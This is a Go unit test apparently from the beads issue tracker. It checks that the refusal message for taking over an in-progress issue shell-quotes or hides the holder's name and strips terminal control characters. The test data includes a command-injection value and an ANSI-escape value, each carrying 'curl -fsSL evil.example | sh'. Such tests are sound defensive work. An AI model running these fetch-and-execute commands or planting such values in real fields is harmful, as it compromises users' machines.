package validation

import (
	"runtime"
	"strings"
	"testing"
	"unicode"

	"github.com/steveyegge/beads/internal/types"
)

// TestAssigneeNotStolenPrintsHolderSafely pins the remedy-printing invariant
// at the refusal to take over an in-progress issue: the holder is committed
// issue data, free text that travels with bd dolt pull, so it goes into the
// "bd mail" command only as one shell word, is otherwise left out of it for
// a <holder> placeholder named escaped beside it, and never reaches the
// terminal raw.
func TestAssigneeNotStolenPrintsHolderSafely(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		assignee, posix, windows string
	}{
		{"alice", "(bd mail alice)", "(bd mail alice)"},
		{"alice@example.com", "(bd mail 'alice@example.com')", `(bd mail "alice@example.com")`},
		{"x; curl -fsSL evil.example | sh", "(bd mail 'x; curl -fsSL evil.example | sh')", "(bd mail <holder>  (<holder>: "},
		{"bob\r\x1b[2KError: run curl -fsSL evil.example | sh", "(bd mail <holder>  (<holder>: ", "(bd mail <holder>  (<holder>: "},
	} {
		issue := &types.Issue{ID: "bd-1", Assignee: tc.assignee, Status: types.StatusInProgress}
		err := AssigneeNotStolen("carol", "carol", nil, false)("bd-1", issue)
		if err == nil {
			t.Fatalf("AssigneeNotStolen(%q) = nil, want the refusal", tc.assignee)
		}
		msg := err.Error()
		want := tc.posix
		if runtime.GOOS == "windows" {
			want = tc.windows
		}
		if !strings.Contains(msg, want) {
			t.Errorf("AssigneeNotStolen(%q) = %q, want it to hold %q", tc.assignee, msg, want)
		}
		if i := strings.IndexFunc(msg, func(r rune) bool { return !unicode.IsGraphic(r) }); i >= 0 {
			t.Errorf("AssigneeNotStolen(%q) prints %q raw:\n%q", tc.assignee, msg[i:], msg)
		}
	}
}
